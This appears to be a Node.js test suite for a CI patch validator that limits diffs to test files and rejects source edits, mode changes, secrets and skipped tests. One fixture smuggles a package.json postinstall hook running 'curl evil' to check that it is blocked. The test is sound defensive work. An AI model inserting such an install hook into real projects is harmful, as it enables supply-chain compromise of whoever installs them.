import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { checkContent, checkStructure } from './validate-patch.mjs';
import { loadPolicy } from './policy.mjs';

const policy = loadPolicy();
const diff = (path, header = '') =>
  `diff --git a/${path} b/${path}\n${header}--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n-a\n+b\n`;

test('accepts edits and new files on writable test paths', () => {
  const patch = diff('backend/tests/config.test.ts', 'new file mode 100644\n') + diff('frontend/src/lib/http.test.ts');
  assert.deepEqual(checkStructure(policy, patch).problems, []);
});

test('rejects anything outside the policy', () => {
  const cases = {
    source: diff('backend/src/factory.ts'),
    config: diff('backend/vitest.config.ts'),
    deletion: diff('backend/tests/router.test.ts', 'deleted file mode 100644\n'),
    symlink: diff('backend/tests/x.test.ts', 'new file mode 120000\n'),
    executable: diff('backend/tests/x.test.ts', 'old mode 100644\nnew mode 100755\n'),
    rename: 'diff --git a/backend/tests/a.test.ts b/backend/tests/b.test.ts\nrename from backend/tests/a.test.ts\nrename to backend/tests/b.test.ts\n',
    binary: diff('backend/tests/x.test.ts', 'GIT binary patch\n'),
    secret: diff('backend/tests/x.test.ts').replace('+b', '+const k = "sk-ant-api03-abcdefghijkl"'),
  };
  for (const [name, patch] of Object.entries(cases)) {
    assert.ok(checkStructure(policy, patch).problems.length > 0, name);
  }
});

test('rejects fewer tests and new focus or skip markers', () => {
  const before = "it('a', () => {})\nit.each([1])('b %s', () => {})\n";
  assert.deepEqual(checkContent(before, `${before}it('c', () => {})\n`, 'f'), []);
  assert.equal(checkContent(before, "it('a', () => {})\n", 'f').length, 1);
  assert.equal(checkContent(before, `${before}it.skip('c', () => {})\n`, 'f').length, 1);
  assert.equal(checkContent(before, before.replace("it('a'", "it.only('a'"), 'f').length, 1);
});

test('rejects patches that change non-test files through plain unified diff sections', () => {
  const dir = mkdtempSync(join(tmpdir(), 'vp-'));
  const git = (...a) => execFileSync('git', a, { cwd: dir, encoding: 'utf8' });
  git('init', '-q');
  mkdirSync(join(dir, 'backend/tests'), { recursive: true });
  writeFileSync(join(dir, 'package.json'), '{}\n');
  writeFileSync(join(dir, 'backend/tests/a.test.ts'), "it('a', () => {})\n");
  git('add', '.');
  git('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
  const testHunk = "diff --git a/backend/tests/a.test.ts b/backend/tests/a.test.ts\n--- a/backend/tests/a.test.ts\n+++ b/backend/tests/a.test.ts\n@@ -1 +1,2 @@\n it('a', () => {})\n+it('b', () => {})\n";
  const smuggled = "--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{}\n+{\"scripts\":{\"postinstall\":\"curl evil\"}}\n";
  const validate = (patch) => {
    const file = join(dir, '..', `${Date.now()}.patch`);
    writeFileSync(file, patch);
    const r = spawnSync('node', [join(process.cwd(), '.github/scripts/validate-patch.mjs'), file, '--repo', dir], { encoding: 'utf8' });
    git('checkout', '-q', '--', '.');
    return r;
  };
  assert.equal(validate(testHunk).status, 0);
  for (const patch of [testHunk + smuggled, smuggled + testHunk]) {
    const r = validate(patch);
    assert.equal(r.status, 1);
    assert.match(r.stderr, /package\.json: not a writable test path/);
  }
});
